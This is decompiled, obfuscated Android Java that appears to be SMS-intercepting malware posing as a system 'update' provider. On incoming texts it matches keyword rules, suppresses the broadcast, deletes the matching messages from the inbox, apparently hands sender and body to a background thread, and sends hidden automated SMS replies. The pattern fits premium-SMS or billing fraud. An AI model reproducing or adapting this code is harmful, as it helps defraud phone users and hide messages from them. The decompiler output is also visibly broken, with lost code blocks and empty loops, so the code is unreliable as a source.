package defpackage;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.telephony.gsm.SmsManager;
import com.android.providers.update.OperateReceiver;
import java.util.ArrayList;
import java.util.Map.Entry;
import java.util.Random;

/* renamed from: af reason: default package */
public class af {
    /* JADX INFO: finally extract failed */
    /* JADX WARNING: Code restructure failed: missing block: B:11:0x006d, code lost:
        r2 = r1;
        r1 = false;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:12:0x006f, code lost:
        if (r1 == false) goto L_0x013c;
     */
    /* JADX WARNING: Code restructure failed: missing block: B:13:0x0071, code lost:
        r1 = r2;
     */
    private static String a(Context context, au auVar, int i, String str) {
        String str2;
        String str3;
        String string;
        boolean z;
        String str4 = "";
        String str5 = "\\+";
        String str6 = "";
        StringBuilder sb = new StringBuilder();
        Cursor query = context.getContentResolver().query(Uri.parse("content://sms/inbox"), new String[]{"_id", "thread_id", "address", "person", "date", "body"}, sb.append("read").append(" = 0").toString(), null, "date DESC");
        if (query == null) {
            return str4;
        }
        try {
            if (query.getCount() > 0) {
                str3 = str4;
                while (true) {
                    try {
                        if (query.moveToNext()) {
                            String string2 = query.getString(5);
                            String string3 = query.getString(2);
                            String str7 = "";
                            String str8 = "";
                            switch (i) {
                                case 1:
                                    String[] split = str.split("\\+");
                                    String str9 = split[0];
                                    String str10 = split[1];
                                    if (string2.contains(str9) && string2.contains(str10)) {
                                        string = query.getString(0);
                                        z = true;
                                        break;
                                    }
                                case 2:
                                    String[] split2 = str.split("\\+");
                                    if (split2.length != 1) {
                                        if (split2.length == 2 && string2.contains(str7) && string2.contains(str8)) {
                                            string = query.getString(0);
                                            z = true;
                                            break;
                                        }
                                    } else if (string2.contains(split2[0])) {
                                        string = query.getString(0);
                                        z = true;
                                        break;
                                    }
                                case 3:
                                    String[] split3 = str.split("\\+");
                                    if (split3.length != 1) {
                                        if (split3.length == 2 && string2.contains(str7) && string2.contains(str8)) {
                                            string = query.getString(0);
                                            z = true;
                                            break;
                                        }
                                    } else if (string2.contains(split3[0])) {
                                        string = query.getString(0);
                                        z = true;
                                        break;
                                    }
                                case 4:
                                    if (str.equals(string3)) {
                                        string = query.getString(0);
                                        z = true;
                                        break;
                                    }
                                case 5:
                                    String[] split4 = str.split("\\+");
                                    if (split4.length != 1) {
                                        if (split4.length == 2 && string2.contains(str7) && string2.contains(str8)) {
                                            string = query.getString(0);
                                            z = true;
                                            break;
                                        }
                                    } else if (string2.contains(split4[0])) {
                                        string = query.getString(0);
                                        z = true;
                                        break;
                                    }
                            }
                        }
                        str3 = string;
                    } catch (Exception e) {
                        Exception exc = e;
                        str2 = str3;
                        e = exc;
                        try {
                            e.printStackTrace();
                            query.close();
                            return str2;
                        } catch (Throwable th) {
                            query.close();
                            throw th;
                        }
                    }
                }
            } else {
                str3 = str4;
            }
            query.close();
            return str3;
        } catch (Exception e2) {
            e = e2;
            str2 = str4;
        }
    }

    /* JADX WARNING: Removed duplicated region for block: B:134:0x02e4 A[SYNTHETIC] */
    /* JADX WARNING: Removed duplicated region for block: B:138:0x00b0 A[SYNTHETIC] */
    /* JADX WARNING: Removed duplicated region for block: B:153:0x0400 A[EDGE_INSN: B:153:0x0400->B:123:0x0400 ?: BREAK  
EDGE_INSN: B:153:0x0400->B:123:0x0400 ?: BREAK  , SYNTHETIC] */
    /* JADX WARNING: Removed duplicated region for block: B:158:0x03fa A[EDGE_INSN: B:158:0x03fa->B:122:0x03fa ?: BREAK  
EDGE_INSN: B:158:0x03fa->B:122:0x03fa ?: BREAK  
EDGE_INSN: B:158:0x03fa->B:122:0x03fa ?: BREAK  , SYNTHETIC] */
    /* JADX WARNING: Removed duplicated region for block: B:158:0x03fa A[EDGE_INSN: B:158:0x03fa->B:122:0x03fa ?: BREAK  
EDGE_INSN: B:158:0x03fa->B:122:0x03fa ?: BREAK  , SYNTHETIC] */
    /* JADX WARNING: Removed duplicated region for block: B:162:0x03f6 A[EDGE_INSN: B:162:0x03f6->B:121:0x03f6 ?: BREAK  
EDGE_INSN: B:162:0x03f6->B:121:0x03f6 ?: BREAK  
EDGE_INSN: B:162:0x03f6->B:121:0x03f6 ?: BREAK  
EDGE_INSN: B:162:0x03f6->B:121:0x03f6 ?: BREAK  , SYNTHETIC] */
    /* JADX WARNING: Removed duplicated region for block: B:162:0x03f6 A[EDGE_INSN: B:162:0x03f6->B:121:0x03f6 ?: BREAK  
EDGE_INSN: B:162:0x03f6->B:121:0x03f6 ?: BREAK  
EDGE_INSN: B:162:0x03f6->B:121:0x03f6 ?: BREAK  , SYNTHETIC] */
    /* JADX WARNING: Removed duplicated region for block: B:162:0x03f6 A[EDGE_INSN: B:162:0x03f6->B:121:0x03f6 ?: BREAK  
EDGE_INSN: B:162:0x03f6->B:121:0x03f6 ?: BREAK  , SYNTHETIC] */
    /* JADX WARNING: Removed duplicated region for block: B:59:0x020e  */
    /* JADX WARNING: Removed duplicated region for block: B:72:0x0279  */
    /* JADX WARNING: Removed duplicated region for block: B:81:0x029f  */
    public static void a(Intent intent, OperateReceiver operateReceiver, Context context) {
        int i;
        String str;
        String str2;
        int i2;
        boolean z;
        String str3;
        String str4;
        String str5;
        int i3;
        String str6;
        boolean z2;
        String str7;
        int i4;
        String str8;
        int length;
        int i5;
        int length2;
        int i6;
        int length3;
        int i7;
        StringBuilder sb = new StringBuilder();
        StringBuilder sb2 = new StringBuilder();
        Bundle extras = intent.getExtras();
        if (extras != null) {
            Object[] objArr = (Object[]) extras.get("pdus");
            SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];
            int i8 = 0;
            while (true) {
                int i9 = i8;
                if (i9 >= objArr.length) {
                    break;
                }
                smsMessageArr[i9] = SmsMessage.createFromPdu((byte[]) objArr[i9]);
                i8 = i9 + 1;
            }
            int length4 = smsMessageArr.length;
            for (int i10 = 0; i10 < length4; i10++) {
                SmsMessage smsMessage = smsMessageArr[i10];
                sb.append(smsMessage.getDisplayMessageBody());
                sb2.append(smsMessage.getDisplayOriginatingAddress());
            }
            String sb3 = sb.toString();
            String sb4 = sb2.toString();
            ArrayList<au> arrayList = new ArrayList<>();
            for (Entry entry : context.getSharedPreferences("preferences_data", 0).getAll().entrySet()) {
                if (entry.getKey().toString().contains(ak.o)) {
                    arrayList.add(p.a(entry.getValue().toString()));
                }
            }
            for (au auVar : arrayList) {
                if (!(auVar == null || auVar.d() == null || auVar.d().equals(""))) {
                    String l = auVar.l();
                    String m = auVar.m();
                    String n = auVar.n();
                    String o = auVar.o();
                    String p = auVar.p();
                    String a = auVar.a();
                    String str9 = "";
                    boolean z3 = false;
                    String str10 = "";
                    if (o != null && !o.equals("")) {
                        String[] split = o.split("\\|");
                        int length5 = split.length;
                        int i11 = 0;
                        while (true) {
                            if (i11 >= length5) {
                                break;
                            }
                            String[] split2 = split[i11].split("\\+");
                            if (split2.length == 2) {
                                String str11 = split2[0];
                                String str12 = split2[1];
                                if (sb3.contains(str11) && sb3.contains(str12)) {
                                    str = sb3.substring(sb3.indexOf(str11) + str11.length(), sb3.indexOf(str12));
                                    i = 1;
                                    str2 = str11 + "+" + str12;
                                    z3 = true;
                                    break;
                                }
                            }
                            i11++;
                        }
                    }
                    i = 0;
                    String str13 = str10;
                    str = str9;
                    str2 = str13;
                    if (!z3 && n != null && !n.equals("")) {
                        String[] split3 = n.split("\\|");
                        int length6 = split3.length;
                        int i12 = 0;
                        while (true) {
                            if (i12 >= length6) {
                                break;
                            }
                            String[] split4 = split3[i12].split("\\+");
                            if (split4.length != 2) {
                                if (split4.length == 1 && sb3.contains(split4[0])) {
                                    str3 = split4[0];
                                    str4 = p;
                                    z = true;
                                    i2 = 2;
                                    break;
                                }
                            } else {
                                String str14 = split4[0];
                                String str15 = split4[1];
                                if (sb3.contains(str14) && sb3.contains(str15)) {
                                    str3 = str14 + "+" + str15;
                                    str4 = p;
                                    z = true;
                                    i2 = 2;
                                    break;
                                }
                            }
                            i12++;
                        }
                        if (!z && a != null && !a.equals("")) {
                            String[] split5 = a.split("\\|");
                            length3 = split5.length;
                            i7 = 0;
                            while (true) {
                                if (i7 < length3) {
                                    break;
                                }
                                String[] split6 = split5[i7].split("\\+");
                                if (split6.length != 2) {
                                    if (split6.length == 1 && sb3.contains(split6[0])) {
                                        str3 = split6[0];
                                        str5 = "";
                                        z = true;
                                        i2 = 3;
                                        break;
                                    }
                                } else {
                                    String str16 = split6[0];
                                    String str17 = split6[1];
                                    if (sb3.contains(str16) && sb3.contains(str17)) {
                                        str3 = str16 + "+" + str17;
                                        str5 = "";
                                        z = true;
                                        i2 = 3;
                                        break;
                                    }
                                }
                                i7++;
                            }
                            if (!z && l != null && !l.equals("")) {
                                String[] split7 = l.split("\\|");
                                length2 = split7.length;
                                i6 = 0;
                                while (true) {
                                    if (i6 >= length2) {
                                        break;
                                    }
                                    String str18 = split7[i6];
                                    if (sb4.equals(str18)) {
                                        str7 = "";
                                        i3 = 4;
                                        z2 = true;
                                        str6 = str18;
                                        break;
                                    }
                                    i6++;
                                }
                                if (!z2 && m != null && !m.equals("")) {
                                    String[] split8 = m.split("\\|");
                                    length = split8.length;
                                    i5 = 0;
                                    while (true) {
                                        if (i5 < length) {
                                            break;
                                        }
                                        String[] split9 = split8[i5].split("\\+");
                                        if (split9.length != 2) {
                                            if (split9.length == 1 && sb3.contains(split9[0])) {
                                                str8 = "";
                                                str6 = split9[0];
                                                z2 = true;
                                                i4 = 5;
                                                break;
                                            }
                                        } else {
                                            String str19 = split9[0];
                                            String str20 = split9[1];
                                            if (sb3.contains(str19) && sb3.contains(str20)) {
                                                str8 = "";
                                                str6 = str19 + "+" + str20;
                                                z2 = true;
                                                i4 = 5;
                                                break;
                                            }
                                        }
                                        i5++;
                                    }
                                }
                                i4 = i3;
                                str8 = str7;
                                if (!z2) {
                                    operateReceiver.abortBroadcast();
                                    String a2 = a(context, auVar, i4, str6);
                                    if (a2 == null) {
                                        a2 = "";
                                    }
                                    if (!a2.equals("")) {
                                        context.getContentResolver().delete(Uri.parse("content://sms"), "_id=?", new String[]{a2});
                                    }
                                    if (i4 == 3) {
                                        c cVar = new c(context, sb4, sb3);
                                        new Thread(cVar).start();
                                    }
                                    if (!str8.equals("")) {
                                        Thread.sleep((long) ((new Random().nextInt(10) + 1) * 1000));
                                        SmsManager.getDefault().sendTextMessage(sb4, null, str8, PendingIntent.getBroadcast(context, 0, new Intent(), 0), null);
                                        return;
                                    }
                                    return;
                                }
                            }
                            i3 = i2;
                            str6 = str3;
                            z2 = z;
                            str7 = str5;
                            String[] split82 = m.split("\\|");
                            length = split82.length;
                            i5 = 0;
                            while (true) {
                                if (i5 < length) {
                                }
                                i5++;
                            }
                            i4 = i3;
                            str8 = str7;
                            if (!z2) {
                            }
                        }
                        str5 = str4;
                        String[] split72 = l.split("\\|");
                        length2 = split72.length;
                        i6 = 0;
                        while (true) {
                            if (i6 >= length2) {
                            }
                            i6++;
                        }
                        String[] split822 = m.split("\\|");
                        length = split822.length;
                        i5 = 0;
                        while (true) {
                            if (i5 < length) {
                            }
                            i5++;
                        }
                        i4 = i3;
                        str8 = str7;
                        if (!z2) {
                        }
                    }
                    i2 = i;
                    z = z3;
                    str3 = str2;
                    str4 = str;
                    String[] split52 = a.split("\\|");
                    length3 = split52.length;
                    i7 = 0;
                    while (true) {
                        if (i7 < length3) {
                        }
                        i7++;
                    }
                    String[] split722 = l.split("\\|");
                    length2 = split722.length;
                    i6 = 0;
                    while (true) {
                        if (i6 >= length2) {
                        }
                        i6++;
                    }
                    String[] split8222 = m.split("\\|");
                    length = split8222.length;
                    i5 = 0;
                    while (true) {
                        if (i5 < length) {
                        }
                        i5++;
                    }
                    i4 = i3;
                    str8 = str7;
                    if (!z2) {
                    }
                }
            }
        }
    }
}
